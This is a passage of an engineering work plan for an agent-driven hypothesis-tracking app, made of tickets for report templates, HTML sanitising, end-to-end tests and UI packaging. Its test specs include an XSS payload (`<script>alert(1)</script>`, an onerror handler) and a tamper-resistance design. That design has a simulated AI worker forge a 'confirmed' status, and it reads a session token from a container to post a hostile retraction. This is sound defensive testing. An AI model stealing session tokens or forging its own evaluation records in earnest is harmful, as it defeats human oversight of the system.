  - A hypothesis with no candidate shows a clear state saying the interview has not produced one
    yet, not an error.
- **TDD:** yes for the gate logic and the URL listing; no for layout.
- **Validation:** `cd web && yarn test && yarn typecheck`
- **Depends on:** W23, W13
- [ ] done
- Notes:

### W25: Report authoring prompts   [Status: pending | Model: opus]
- **Scope:** `prompts/report-authoring.md`, the fixture that keeps it honest, and the interviewer
  and researcher changes that reference it.
- **Repo:** agent-wolf
- **Files:** create `prompts/report-authoring.md`,
  `api/src/report/__fixtures__/example-template.html`,
  `api/src/report/fixture.test.ts`; modify `prompts/interviewer.md`,
  `prompts/researcher-preamble.md`.
- **Acceptance criteria:**
  - `report-authoring.md` states the contract exactly: the template is an HTML **fragment**; slots
    are `[data-wolf-slot]`; scripts, stylesheets and every URL live **only** in the template; the
    daily tick fills declared slots and may emit no URLs at all; series arrive on
    `window.__WOLF_SERIES__` keyed by metric slug with **`tMs`** in epoch milliseconds; a
    `[data-wolf-fallback]` element is mandatory **and the template's own script must remove it once
    the chart renders**, or every working report permanently displays a failure message; every URL
    must be `https:`.
  - It states that **the interviewer writes `kind=report-candidate`** and that **the researcher may
    propose a template change but never enact one**, mirroring the spec-amendment rule.
  - The worked example lives at `api/src/report/__fixtures__/example-template.html` and is
    referenced from the prompt by path, not pasted twice. `api/src/report/fixture.test.ts` asserts
    it passes `parseTemplate` and `validateTemplate`, so the documentation cannot rot away from the
    parser.
  - `interviewer.md` requires a candidate report as an interview output and restates that the
    interviewer cannot go live.
  - `researcher-preamble.md` requires a `kind=report` memory each tick, headline on line 1,
    `embed: false`.
- **TDD:** no for prose; **yes** for the fixture test.
- **Validation:** `cd api && yarn test && yarn typecheck` — 🔴 **the WHOLE api suite (R117's sweep, fourth instance), and here the filtered form is PROVABLY wrong rather than merely risky.** This ticket modifies `prompts/interviewer.md` and `prompts/researcher-preamble.md`, and **both are read verbatim by tests in OTHER files** — `api/src/bootstrap/bootstrap-project.test.ts` (three cases asserting the stored worker prompt equals the file byte-for-byte) and `api/src/hypothesis/provision.test.ts` (which reads both preamble and method body). `yarn test src/report/fixture` runs **zero** of them.
- **Depends on:** W17, W12
- [ ] done
- Notes: 🔴 **PRE-FLIGHT, 2026-08-26 — `prompts/researcher-preamble.md` carries a LOAD-BEARING INVARIANT that a careless edit breaks silently (R93, re-checked and still live).** `api/src/hypothesis/provision.test.ts:483-485` asserts the file contains `<!-- WOLF:METHOD-BODY -->` **exactly twice** — once as prose inside backticks near the top, once as the real boundary line — and that **exactly one** occurrence is a whole line on its own. `splitAtMethodMarker` splits the preamble into a **locked** half and a **mutable** method-body half; a naive substring split cuts at the prose occurrence and *silently makes most of the locked preamble mutable, with nothing failing anywhere*. Your edit must preserve both counts. Verify with `grep -c` for the token and for whole-line matches before you commit, and note this is exactly why your Validation is the whole suite. **Hand-off from W17 (2026-08-26).** (1) 🔴 **Forbid a slot on a raw-text element** (`<style>`, `<title>`, `<textarea>`, `<xmp>`) — sanitised output is safe only in element-content context, so such a slot is a breakout site closed today only by a DOMPurify regex (**R150(3)**). (2) 🔴 **Table structure lives in the TEMPLATE, not in a slot.** `sanitiseSlot` parses in body context and cannot know its slot sits inside a `<tbody>` or `<tr>`, so a model filling a table-internal slot with `<tr><td>…</td></tr>` **loses the tags to the parser**, keeps only the text, and `strippedCount` reports **0** — silent. (3) **R118(3)** is still yours: the attribute path refuses a same-document fragment anchor (`<a href="#chart">`, `<use href="#glyph">`) while the CSS path has an explicit `#fragment` carve-out for `fill:url(#gradient)`. One sentence in the authoring contract, so the worked example is not written and then rejected. (4) `image-set()` **is** supported now including `type()` and the vendor prefix (R118(1), folded into W30) — the spec's own example parses.

### W26: End-to-end verification   [Status: pending | Model: opus]
- **Scope:** Prove the feature works against the running stack, and prove the security boundary
  holds where it actually matters.
- **Repo:** agent-wolf (extends X1's rig)
- **Files:** create `e2e/features/report-layer.spec.ts`.
- **Acceptance criteria:**
  - **Happy path:** go live with a template → run a tick → open the detail page → the chart element
    exists inside the frame and the headline appears on the board.
  - **Sanitiser leg:** a tick whose slot content contains `<script>alert(1)</script>`, an `onerror`
    handler and an `<img src="https://…">` renders with none of them present in the frame DOM, and
    the strip-count notice is visible.
  - **Boundary leg:** from inside the frame, `window.origin === "null"` — the origin is opaque.
  - **Direct-navigation leg:** requesting `/api/hypotheses/:id/report/frame` **as a top-level
    document** still yields an opaque origin, proving the CSP `sandbox` directive is doing the work
    rather than the iframe attribute. This is the regression test for the hole an earlier draft had.
  - **Cross-hypothesis leg:** a report memory labelled for a different hypothesis than the session
    that wrote it does not render, and surfaces as tamper.
  - **Retraction leg:** a template hidden by a retraction with non-empty provenance still renders,
    with a tamper warning.
  - **Drift leg:** a tick filling an undeclared slot shows the drift notice and does not render it.
  - Full gates pass: `cd api && yarn typecheck && yarn test`; `cd web && yarn typecheck && yarn
    test`; and in agent-orange `cd go && go build ./... && go vet ./... && go test ./...`.
- **TDD:** no.
- **Validation:** `./e2e/run.sh report-layer` plus the three gate command groups above. *(X1 must
  give `run.sh` an optional spec-name filter, so `./e2e/run.sh report-layer` is a defined command.
  The § it used to cite does not exist in this document — R154.)*
- **Depends on:** W24, W25, X1
- [ ] done
- Notes:

---

### X1: End-to-end verification   [Status: pending | Model: opus]
- **Scope:** Prove the whole product works against both stacks in mock-model mode: create a
  hypothesis, run the interview, go live, run a tick, confirm a dataset was written, confirm the
  chart renders, trip a condition, record a human verdict, verify teardown — plus the two tamper
  attacks, which are the only tests that grade the trust model at all. This ticket also owns the
  rig every later e2e spec extends, so `e2e/run.sh` takes an optional spec-name filter.
- **Repo:** agent-wolf (with agent-orange running alongside)
- **Files:** create `e2e/run.sh`, `e2e/playwright.config.ts`,
  `e2e/features/hypothesis-lifecycle.spec.ts`, `e2e/features/dataset-roundtrip.spec.ts`,
  `e2e/features/tamper-resistance.spec.ts`, `e2e/mock/script.json`, `e2e/orange-override.yml`.
  **No file in agent-orange is edited by this ticket** — the mock script reaches agentd through
  the override file, not through an edit to Orange's `docker-compose.yml`.
- **The mechanisms, named — do not go looking for them:**
  - agentd reads **one** mock script, from `AGENTKIT_MOCK_MODEL_SCRIPT` or
    `AGENTKIT_MOCK_MODEL_SCRIPT_FILE` (`go/cmd/agentd/modelproxy.go:107-108`), at boot. Rules are
    selected by **substring match on the raw request body** and turns by assistant-message count;
    `Block.Input` is fixed JSON with no templating (`go/modelproxy/script.go:19-60`).
  - `SESSION_TOKEN` is injected into each session container (`go/runner.go:2719`) and is the only
    credential that can write a memory carrying non-empty provenance. Session containers carry
    `curl` (`installations/core/Dockerfile:22-25`) and are labelled `agentkit.session-id=<id>`
    (`go/execenv/docker/client.go:204`), so `docker exec <dind> docker ps --filter label=…` finds
    one. agentd's `/mcp` is reachable from inside DinD at `http://localhost:8099/mcp` and from a
    session container at `http://172.17.0.1:8099/mcp`.
- **Acceptance criteria:**
  - **Runs offline against the mock model** — no `ANTHROPIC_API_KEY`, no `CLAUDE_CODE_OAUTH_TOKEN`,
    no billable call. `run.sh` asserts the boot line
    `[agentd] ANTHROPIC_API_KEY unset → MOCK model proxy (set it for a real agent)` is present in
    `docker compose logs agentd` and exits non-zero if it is not, per `README-stack.md` § "The
    known-good local/mock invocation".
  - **Ports are pinned explicitly for both stacks, because the defaults collide.** `run.sh` starts
    Orange with `WEB_PORT=8090` and Wolf with `WOLF_WEB_PORT=8091`, and builds `wolf-web` with
    `VITE_ORANGE_PUBLIC_URL=http://localhost:8090`. Wolf's default 8081 is exactly the port
    `README-stack.md`'s known-good mock invocation gives Orange, and `docker compose up` then fails
    on port allocation.
  - **`http://localhost:8091` is in the `wolf` project's `allowed_origins`.** `run.sh` exports
    `AGENTKIT_PROJECT_MAP` (forwarded to agentd at `docker-compose.yml:146`) in O8's object form,
    with `api_key_env: WOLF_API_KEY` and that origin listed. Without the origin the embed page's
    CSP is `frame-ancestors` over the configured origins only and the chat iframe is blocked
    outright (`go/cmd/agentd/embedcsp.go`), which reads as a broken UI rather than a config error.
    `run.sh` also exports `WOLF_API_KEY`, `WOLF_MCP_TOKEN` and `AGENTKIT_MCP_ENV=WOLF_MCP_TOKEN`,
    which reach agentd only through the explicit compose lines O8 adds.
  - **One mock rules table**, `e2e/mock/script.json`, with two rules: `{"match": "interviewer"}` and
    `{"match": "researcher-"}` — the second matches the stable worker-name prefix, because the
    hypothesis id is generated at runtime while the script is read at agentd boot. `tool_use` blocks
    use fully-qualified names: `mcp__core__memory_create`, `mcp__core__dataset_put`,
    `mcp__wolf__series_fetch`.
  - `e2e/orange-override.yml` is passed to Orange's compose with `-f` and bind-mounts
    `e2e/mock/script.json` to `/mock-model-script.json` on the `agentd` service, with
    `AGENTKIT_MOCK_MODEL_SCRIPT_FILE` pointing at it.
  - The interview rule drives the interviewer to deposit a valid `kind=hypothesis-spec-candidate`
    memory (W12's deposit contract) whose spec validates — the Go Live gate reads it, so an invalid
    one makes every later step untestable.
  - **Go-live needs a locked report template.** W9, as amended by the report-layer plan, refuses
    go-live unless a trusted `report-template` exists, so the interview rule also deposits a
    `kind=report-candidate` memory and `run.sh` accepts it by POSTing its HTML to
    `POST /api/hypotheses/:id/report-template` (expects **201**) before calling go-live. Skip this
    and go-live is refused and every later step of the lifecycle spec is untestable.
  - **The tick turns are:** (1) `mcp__wolf__series_fetch`; (2) a `Bash` heredoc writing a
    **fixture** CSV to `/workspace/<id>-<metric>.csv`, chosen so it trips the hypothesis's
    condition; (3) `mcp__core__dataset_put(name, path, if_version: 0)`. A comment in the spec states
    that the mock **cannot** pipe `series_fetch`'s `download_url` into a later turn's tool input
    (`go/modelproxy/script.go:19-60` — static inputs), so this leg proves tool reachability and the
    dataset write path, **not** provider→dataset fidelity; the byte-level round trip is O9's job.
  - The CSV fixture is the canonical dataset CSV: header exactly `timestamp,value`, RFC3339 UTC,
    ascending, LF endings. A `t,value` header would make the poller read zero observations from a
    legitimately written dataset with no error anywhere.
  - The schedule is created with `WOLF_SCHEDULE_CRON="* * * * *"` — there is **no force-fire
    route**; the scheduler fires on cron minutes only, and nicknames are refused
    (`go/agentdb/schedules.go:827`).
  - After the tick, `GET /agent/datasets/<id>-<metric>` reports `version >= 1` and the detail page
    renders points. Dataset names carry the **bare** id and session names carry the `hyp-` prefix
    (§ Vocabulary) — `hyp-hyp-…` is the failure this assertion catches.
  - **Sign-in uses the test-only login.** `run.sh` sets `WOLF_TEST_LOGIN="email:password"` and every
    spec signs in through `POST /api/auth/dev-login` (W8's route, per owner decision **B6**).
    Playwright cannot obtain a real Google ID token offline, and forging a session cookie in the
    test would prove the cookie, not the login.
  - **`tamper-resistance.spec.ts` covers both attacks, and states how each is driven:**
    - **(a) forged state** — a mock-script rule on the researcher worker emits
      `mcp__core__memory_create` with the static labels
      `{kind: hypothesis, name: <id>, status: confirmed}`. The labels are constant, so a static
      script suffices.
    - **(b) hostile retraction** — needs the trusted row's **runtime uuid**, which a static script
      cannot carry. The spec reads that id from `GET /agent/memories?selector=kind%3Dhypothesis,
      name%3D<id>` with `WOLF_API_KEY`; `run.sh` reads `SESSION_TOKEN` out of the running
      `hyp-<id>` session container (`docker exec <dind> docker exec <session container> printenv
      SESSION_TOKEN`); and the spec POSTs `memory_create` with `labels: {retracts: "<trusted-id>"}`
      to agentd's `/mcp` using that token.
    - 🔴 **The retraction must NOT be appended with `WOLF_API_KEY`.** That yields *empty*
      provenance, which Wolf honours by design, so the test would pass while proving the opposite
      of its claim. The spec asserts `created_by_session` on the retracting memory is **non-empty**
      before asserting anything about the board.
    - In both cases the board still shows the real status **and** displays a tamper warning naming
      the writer, with `reason` `forged_row` for (a) and `hostile_retraction` for (b).
  - After the verdict: the schedule is gone, the worker is gone, the session is gone, **and the
    dataset is still readable**. Teardown order is asserted by observed effect, not by trust.
  - **The run cleans up after itself.** No leftover sessions hold ports — including the per-tick job
    sessions, not just `hyp-<id>` — and `run.sh` cleans up on failure too, since a failed run that
    leaks sessions poisons the next one (the pool is 100 and every session holds a host port).
  - **`e2e/run.sh [<spec-name>]`**: with no argument it runs every spec; with one it runs
    `e2e/features/<spec-name>.spec.ts` only, so `./e2e/run.sh report-layer` is a defined command
    once W26 lands. An unknown name exits non-zero rather than passing vacuously with zero tests.
  - `run.sh` calls W12's `scripts/load-image-into-dind.sh` before creating any hypothesis. A
    host-built Wolf image is invisible to sessions, and the tick would otherwise run in an image
    with no python.
- **TDD:** no (verification is the deliverable).
- **Validation — all five must pass:**
  - `cd go && go build ./... && go vet ./... && go test ./...`   *(agent-orange; note this
    excludes `go/systemtest` and every other `//go:build integration` package — O9 gates those)*
  - `cd go && AGENTKIT_TEST_POSTGRES_URL=<see § "The throwaway Postgres"> go test ./agentdb/...
    -run 'Live' -count=1 -v | grep -E '^--- (PASS|SKIP|FAIL)'` — every line must be `PASS`, with
    **zero `--- SKIP`**. Without the variable the live cases skip silently and the gate above
    proves much less than it appears to
  - `cd api && yarn typecheck && yarn test`   *(agent-wolf; 0 skipped)*
  - `cd web && yarn typecheck && yarn test`   *(agent-wolf; 0 skipped)*
  - `./e2e/run.sh`   *(agent-wolf)*, and `./e2e/run.sh tamper-resistance` to prove the filter
- **Depends on:** O8, O10, W10, W14, **W22** *(revision 5, R128: X1 goes live, and the "a template must exist" gate is now W22's, not W9's. W22 depends on W21, so the `report-template` route is still covered — but the ticket that can BLOCK a go-live is W22 and that is what X1 must follow.)* *(O8 is the ticket that forwards `WOLF_API_KEY`,
  `WOLF_MCP_TOKEN` and `AGENTKIT_MCP_ENV` to agentd and documents the project map — none of them
  reaches the stack without it, and it is not implied transitively by O10. W10's poller is the only
  thing that moves a hypothesis `live → challenged` and the only writer of the `kind=evaluation`
  memory the board's `support_score` comes from — X1 cannot trip a condition without it. W21 owns
  `POST …/report-template`, without which W9's amended go-live refuses every hypothesis)*
- [ ] done
- Notes:

---

### O12: Publish `@agentkit/chat-ui`   [Status: done | Model: opus]
- **Scope:** Turn `web/` from an aliased source folder into an installable package, to the exact
  shape the **R125** probe proved. This is the ticket that makes revision 5's tiered UI reuse real.
- **Repo:** agent-orange
- **Files:** modify `web/package.json`, `web/tsconfig.json`; create `web/tsconfig.build.json`,
  `web/scripts/verify-package.sh`; modify `examples/web/vite.config.ts`, `examples/web/package.json`,
  `.github/workflows/ci.yml`.
- **Acceptance criteria:**
  - `web/package.json` drops `"private": true`, carries a real `version`, and **moves five runtime
    deps out of `devDependencies` into `dependencies`**: `@mui/icons-material`, `react-markdown`,
    `remark-gfm`, `prism-react-renderer`, `@untitledui/file-icons`. `react`, `react-dom`,
    `@mui/material` and both `@emotion/*` stay **peer** deps — that is what keeps one React copy and
    one emotion cache in the consumer, verified by the probe.
  - **A build config that emits.** `tsconfig.json` keeps `noEmit` for the editor;
    `tsconfig.build.json` extends it with `noEmit: false`, `allowImportingTsExtensions: false`,
    `declaration: true`, and **excludes** `src/**/*.test.ts(x)`, `src/__fixtures__` and
    `src/test-setup.ts` — the probe confirmed those otherwise land in `dist`.
  - 🔴 **Subpath exports, because without them the tier line is notional.** `exports` declares
    `"."` (everything), `"./pure"` (tier 1 — types, `agentEventReducer`, `replayEvents`,
    `artifactTree`, `artifactFilters`, `permalink`; **no React import anywhere in its graph**) and
    `"./components"` (tier 2 — the presentational components). A test asserts importing
    `@agentkit/chat-ui/pure` does not pull `AgentChat`. The probe measured **37–45s** of resolution
    for one test file through the barrel; that cost is the symptom, the unenforceable tier line is
    the defect.
  - 🔴 **`web/scripts/verify-package.sh` reproduces the R125 probe as a repeatable check** and CI
    runs it: build → `npm pack` → install the tarball into a throwaway app with its **own**
    react/MUI/emotion → render `ArtifactPanel` → assert (a) the artifact filenames appear, (b) the
    render does not throw (two React copies raise an invalid-hook-call), and (c) **a `live` status
    dot computes to the CONSUMER's `success.main`, not Orange's** — that last assertion is the whole
    reason the package exists and is the one a refactor will silently break.
  - **Orange's own source imports are NOT changed.** The probe isolated this: rebuilding with the
    11 `@mui/material/styles` imports intact still passed 4/4. Any ticket that "fixes" them is out
    of scope and should be refused.
  - `examples/web` consumes `dist` rather than the source alias, and its ten-package `dedupe` list
    shrinks to whatever remains genuinely necessary — the probe needed **none** in the consumer.
    `examples/web` must still build.
  - **No semver ceremony.** Owner decision 2026-08-24: consumers pin exact and both repos move in
    lockstep — "this isn't an open release of a project". Do not add changelogs, deprecation cycles
    or release automation.
- **TDD:** no (packaging), except `verify-package.sh`, which **is** the test.
- **Validation:**
  - `cd web && npm run build && ls -l dist/index.js dist/index.d.ts && ! ls dist | grep -q test`
  - `cd web && ./scripts/verify-package.sh` — must exit 0 and print the computed dot colour
  - `cd web && npm test && npm run typecheck`
  - `cd examples/web && yarn build` — proves the shell still builds against `dist`
- **Depends on:** —
- [x] done — verified by the orchestrator 2026-08-24, zero fix rounds. Merged to agent-orange `main` as `437abb1`; main gated green after (go build + vet clean, `web` **72 files / 1395 tests** up from 71 / 1381, typecheck clean, `examples/web` builds against `dist`).
- Notes: **Verified directly by the orchestrator** — the implementer went idle without delivering a report (**R131**). `web/scripts/verify-package.sh` **passes on `main`** and was proved load-bearing rather than decorative by two mutations, both caught: hardcoding `ArtifactPanel`'s `live` dot to `#ff0000` (defeating host theming) and re-exporting `AgentChat` from `./pure` (defeating the tier line). It packs a 228-file tarball, asserts no tests are in it, installs into a throwaway app under `/tmp` carrying its **own** react/MUI/emotion, checks the tier line on the **installed** files (`dist/pure.js: 8 modules, 0 package imports, no AgentChat`) and asserts the rendered dot computes to `rgb(0, 229, 160)` — the **consumer's** `success.main`. Package shape confirmed: `private` absent, all five runtime deps moved to `dependencies`, the five peers intact, and `exports` declaring `.`, `./pure`, `./components`. `examples/web`'s dedupe list shrank **10 → 6**, dropping exactly the four packages that became dependencies. 🔴 **The ticket's prohibition held: not one existing file under `web/src/` was modified** — only `pure.ts`, `pure.test.ts` and `components/index.ts` were added. **One in-scope extension the implementer made and was right to make:** it corrected `CLAUDE.md`, which asserted that `web/`'s build "emits no `dist/`" — a statement O12 falsifies and which would have misled every later agent. It follows that file's existing *"this entry previously said…"* convention. See also **R132** for the operator trap this surfaces.

### O13: Kill the icons-material barrel import   [Status: done | Model: opus]
- **Scope:** Convert Orange's seven remaining `@mui/icons-material` barrel imports to deep imports,
  and add a `./components/*` wildcard export. Raised by **R136** and executed by the orchestrator.
- **Repo:** agent-orange
- **Files:** modify `web/package.json` (wildcard export, version), and the seven components under
  `web/src/components/` that imported the icons barrel.
- **Acceptance criteria (all met):**
  - No file under `web/src` imports `from '@mui/icons-material'` — 27 icons converted across
    `ArtifactPanel`, `ArtifactViewer`, `ArtifactTreeView`, `ArtifactGrid`, `ArtifactLightbox`,
    `ArtifactPreviewDialog` and `InlineArtifactPreview`. Eleven other files already deep-imported;
    this makes the tree consistent.
  - `exports` gains `"./components/*"` → `./dist/components/*.js` with matching types.
  - Orange stays green: `web` 72 files / 1395 tests, `typecheck` clean, `verify-package.sh` PASS,
    `examples/web` builds, `go build ./...` unaffected.
  - Version bumped per **R134** (0.1.0 → 0.1.2 across two republishes) and re-vendored into Wolf.
- **TDD:** no (mechanical import rewrite, covered by the existing 1395 tests).
- **Validation:** `cd web && npm test && npm run typecheck && ./scripts/verify-package.sh`;
  `cd examples/web && yarn build`; then in agent-wolf `cd web && yarn test && yarn typecheck`.
- **Depends on:** O12
- [x] done — merged to agent-orange `main` as `e22e6d8` and re-vendored into agent-wolf `main`. Wolf `web` **42.93s → 1.18s**.
- Notes: See **R136** — the fix that was expected to work (the `./components` wildcard) did not, and
  its failure is what identified the real cause.

### W27: The attention model   [Status: pending | Model: opus]
- **Scope:** Make the board's attention tiers computable server-side, from signals the system
  already produces and then discards.
- **Repo:** agent-wolf
- **Files:** modify `api/src/hypothesis/store.ts`, `api/src/hypothesis/poller.ts`,
  `api/src/routes/hypotheses.ts` and their tests.
- **Acceptance criteria:**
  - 🟢 **`attention` is already computed daily and thrown away — surface it.** W10's poller appends
    ` attention=<n>` to line 1 of the evaluation memory (`store.ts:583`), and
    `parseEvaluationSummaryLine` tokenises the whole line into `found`, requires five keys, and
    returns only those five (`store.ts:466-483`). Add `attention?: number` to
    `EvaluationSummaryLine` and read it. **Absent stays absent** — do not default it to `0`, or
    "nothing raised" and "an old memory written before this token existed" become the same value.
  - **`stale=<n>` joins the summary line, by the same mechanism and for the same reason.**
    Staleness lives in `EvaluationResult.metrics[].stale`, inside the JSON body, and the board reads
    only the 500-byte snippet. Emit the token **only when `n > 0`**. The justification is W10's own:
    the memory is written only when line 1 changes, so a signal that is not on line 1 has its own
    write suppressed. A test asserts an evaluation memory written before this token existed still
    parses (the parser ignores unrecognised tokens — that is what makes this safe).
  - **`attention_requests` reaches the board.** It is currently detail-only. It is **one
    project-wide request**, not one per hypothesis, so W22's criterion is restated as *"exactly
    three `latest_per` requests plus one project-wide attention read, regardless of hypothesis
    count"* — a test with twelve hypotheses asserts exactly that.
  - **Each board row carries `attention_tier`**, exactly one of `needs_human` | `watch` |
    `in_interview` | `holding`, computed by the rules pinned in
    `design/2026-08-24-agent-wolf-ui.md` § 4, plus `attention_count` and `stale_count`. A table test
    covers every rule including the boundaries: a `challenged` row, a row with only `tamper`, a row
    with only an attention request, a `live` row with `headline === null`, and a healthy row.
  - **Report drift is deliberately NOT a board signal** — it needs two full-content reads. A test
    asserts the board issues no per-hypothesis read for drift.
- **TDD:** yes.
- **Validation:**
  - `cd api && yarn test src/hypothesis/store src/hypothesis/poller src/routes/hypotheses && yarn typecheck`
  - Confirm the vitest summary reports **3 test files** — a positional filter matching nothing runs
    zero files and exits **0**.
- **Depends on:** W22
- [ ] done
- Notes: 🔴 **From R142's sweep, run 2026-08-26: your fixture set names `live` and `challenged` and the three terminal statuses, and never `draft`.** `draft` is NOT terminal, so W13's client-side filter passes it through and draft rows DO reach the board — which means your server-side tier computation has a `draft` branch that no fixture exercises. That is R146's shape: an untested branch in the one function the board's ordering depends on. Add a `draft` row before you write the tier rules, not after. **Hand-off from W13 (2026-08-24) — three things W13 already decided, see R138.** (1) 🔴 **W13 filters terminal statuses (`confirmed`/`invalidated`/`archived`) off the board CLIENT-SIDE**, per UI design § 3. W27's `HOLDING` rule is "everything else", which would tier a `confirmed` row as `holding`; that is harmless because W13 drops it by status, but **W27 must not also filter**, or the two sides each assume the other did. Record which side owns it. (2) **`restated_from` is not on `BoardRow`**, so `/archive` currently costs one detail read per **terminal** row. The fix is one line in `boardRow` (`api/src/routes/hypotheses.ts`) and W27 owns that file — add it. (3) **Confirm the board's token wording.** W13 renders `attention_count` as `"N attention"` and `stale_count` as `"N stale"`; § 4's mockup shows `1 indet.`, which is `conditions_summary.indeterminate` and already renders separately. Rename in W27 if the mockup's wording is wanted, and W13's row follows. Also: the wire names `attention_tier` / `attention_count` / `stale_count` are **already consumed by W13's fixtures** — changing one silently makes every board row render as unclassified. **(4) 🔴 W14 adds two more projections to the same file — see R143.** `detailRow()` projects ten fields and neither the state memory's `rationale` (which W10 writes as the challenge reason, `poller.ts:466-480`) nor the state-change history reaches the browser, so two of W14's criteria are unbuildable and W14 correctly refused to derive either. Project the rationale as `challenge_reason` and serve the state history for the timeline. **That makes four projections in one file for this ticket** — `attention_tier`/`attention_count`/`stale_count`, `restated_from`, `challenge_reason`, and the state history.

### W28: The design system — theme and the two trust channels   [Status: done | Model: sonnet — run on opus]
- **Scope:** Wolf's theme and the two components every other UI ticket renders trust through. **This
  runs before W13** so four executors consume one vocabulary instead of inventing four.
- **Repo:** agent-wolf
- **Files:** create `web/src/theme.ts`, `web/src/theme.test.ts`,
  `web/src/components/trust/{Provenance,Severity}.tsx` and a `.test.tsx` beside each; modify
  `web/package.json`, `web/vite.config.ts`, `web/src/main.tsx`; create `web/vendor/` and add the
  `@agentkit/chat-ui` tarball. `web/package.json` is shared with W13, W23 and W24 — strictly serial.
- **Acceptance criteria:**
  - `@agentkit/chat-ui` is installed from a **local tarball** under `web/vendor/`, referenced as
    `"file:./vendor/agentkit-chat-ui-<version>.tgz"`. 🔴 **The tarball is produced in the OTHER
    repository** — O12 leaves it at `agent-orange/web/agentkit-chat-ui-<version>.tgz` via
    `npm run build && npm pack`, and this ticket copies that file into `agent-wolf/web/vendor/` and
    commits it — the tarball is **gitignored in agent-orange**, so it is not in a fresh clone. An
    executor holding only the Wolf worktree cannot create one; if it is absent, O12 has not landed
    and this ticket is not ready. O12 fixed the version at `0.1.0`, so the filename is
    `agentkit-chat-ui-0.1.0.tgz`.
  - 🔴 **THE VERSION MUST BE BUMPED ON EVERY REPUBLISH — see R134.** O12 proved under yarn 1 that
    replacing a `file:` tarball at the SAME version makes yarn serve a **stale cached copy**, which
    neither `yarn install --force` nor `yarn cache clean` refreshes, so Wolf would silently build
    against old components with nothing failing. Record the rule beside the dependency in
    `web/package.json`. Do **not** attempt the directory form `"file:../../web"`: yarn 1 raw-copies
    `web/node_modules` with it, giving the consumer a second React, and `files` and `.npmignore`
    are both ignored. Owner decision 2026-08-24: no registry, both
    repos lockstep, revisit when a third application appears.
  - 🔴 **`web/vite.config.ts` sets `test: { server: { deps: { inline: [/@mui/, /@agentkit/] } } }`.**
    Without it every test importing a shared component dies with
    `Directory import '.../@mui/material/utils' is not supported resolving ES modules imported from
    .../@mui/icons-material/esm/utils/createSvgIcon.js`. **That error points at MUI's own ESM build,
    not at us** (R125), and an executor without this criterion would reasonably conclude the package
    is broken. A test imports a tier-2 component and renders it, which fails outright without this.
  - `web/src/theme.ts` implements `design/2026-08-24-agent-wolf-ui.md` § 2b in full: the light and
    dark palettes, the system/monospace typography split with `tabular-nums`, `spacing: 6`, the
    `MuiTableCell` and `MuiChip` density overrides, and **`prefers-color-scheme` selection** — the
    Orange rail follows the OS and cannot be told otherwise, so Wolf follows the same rule or the two
    visibly disagree for half of users.
  - 🔴 **Two rules from § 2b are asserted by test, because they are what make the trust language
    work:** (1) the provenance ground and rule use **no** semantic palette colour — a test asserts
    the rendered background matches neither `warning` nor `error` nor `info` at any shade; (2)
    **`error` red appears nowhere but severity `attacked`** — a test renders every other trust state
    and asserts none computes to the error colour.
  - `<Provenance kind="machine">` renders its children with **no** wrapper treatment at all.
    `kind="model"` renders the ground, the 2px left rule, and a stamp naming
    `worker || session` and a relative time.
  - 🔴 **`<Severity>` has no default cause and refuses to render without one** — `level="degraded"`
    or `"attacked"` with an empty or whitespace `cause` throws in development and renders nothing in
    production, asserted both ways. `level="none"` renders nothing. Every level carries a **glyph as
    well as** a colour (§ 2b's table), so the state survives a greyscale screenshot.
- **TDD:** yes for the two asserted § 2b rules, the `Severity` cause requirement and the
  `kind="machine"` no-op; no for the palette values themselves.
- **Validation:**
  - `cd web && yarn test && yarn typecheck` — confirm vitest reports **0 skipped**
  - `cd web && yarn build` — `tsc -p tsconfig.json && vite build`; proves the theme compiles into
    the production bundle, which `vitest run` does not
- **Depends on:** O12
- [x] done — verified 2026-08-24, one follow-up commit. Merged to agent-wolf `main` as `e902d26`; main gated green after (api 32 files / **1020 tests**, web 6 / **78**, 0 skipped, both typechecks clean, `yarn build` clean).
- Notes: Implemented `1061764`, gaps closed in `72c8d2d`. Its verifier ran **29 mutations and caught 26**, each checked in **both light and dark** — the provenance ground set to `warning.main`, `error.main` and `info.main` in turn; `error` given to `tripped`, `holding`, `indeterminate` and `degraded` in turn; a default `cause` on `<Severity>`; a `<Box>` around `kind="machine"`; the glyph removed from `degraded` and from `attacked` with colour left alone; `deps.inline: []`; `spacing`, `MuiTableCell` and `tabular-nums`. It also checked the easy fake on the production path — forcing `isProductionBuild()` to `false` **fails** the two production tests, so they genuinely execute that branch — and confirmed the tier-2 import resolves to `node_modules/@agentkit/chat-ui` rather than a relative path, with the `live` dot taking **Wolf's** `success.main`. **Three gaps found and closed before merge:** (1) the MUI `Alert` `severity` prop was unasserted — flipping `error`→`warning` changed the colour and the a11y role with nothing going red; now asserted on `MuiAlert-colorError` + `role="alert"` and proved to fail in both modes, which matters because four tickets consume this component; (2) the `web/package.json` R134 note described a repro that does not reproduce (see R134, draft 3); (3) `package.json`'s description still read *"imports nothing from agent-orange"*, which revision 5 reversed. **The implementer logged 29 guesses** — the largest single deliverable of this wave — of which two are load-bearing for later tickets: `web/src/setupTests.ts` exists because of **R135**, and the glyph maps plus `conditionColor()` live in `theme.ts` so W14 and W23 cannot invent their own. Scope was clean: `web/src` holds 12 files, zero pages, zero router, `App.tsx` untouched.

### W29: Wolf's artifact surface   [Status: pending | Model: sonnet]
- **Scope:** Read a hypothesis session's artifacts and render them with Orange's own panel — the
  concrete case that motivated revision 5's tier decision.
- **Repo:** agent-wolf
- **Files:** modify `api/src/orange/client.ts`, `api/src/orange/types.ts`, `api/src/app.ts`; create
  `api/src/routes/artifacts.ts`, `api/src/routes/artifacts.test.ts`,
  `web/src/components/ArtifactsPanel.tsx` and its test; modify `web/src/pages/HypothesisDetail.tsx`.
  `api/src/orange/client.ts` is shared with W2 and W15 — strictly serial.
- **Acceptance criteria:**
  - The Orange client gains reads for `GET /agent/sessions/by-name/{name}/artifacts` and
    `…/artifacts/file?path=…`, authenticated with `WOLF_API_KEY`. **Wolf's client has none today** —
    no method, no type — so this is new surface, not wiring.
  - `GET /api/hypotheses/:id/artifacts` proxies the metadata list server-side, guarded by
    `requireSignedIn`. **Never redirect the browser to Orange** and **never log a `download_url`** —
    both asserted, the second against captured `pino` lines.
  - The UI renders `ArtifactPanel` **imported from `@agentkit/chat-ui/components`**, under Wolf's
    `ThemeProvider`. A test asserts a `live` artifact's status dot computes to **Wolf's**
    `success.main` — the same assertion `verify-package.sh` makes in Orange, made again at the point
    of use, because that is what proves the shared component is themed by its host.
  - The panel renders inside `Provenance kind="machine"`: artifact **metadata** is Orange's record
    of what a container wrote, not model prose. Their contents are a different question and are out
    of scope here.
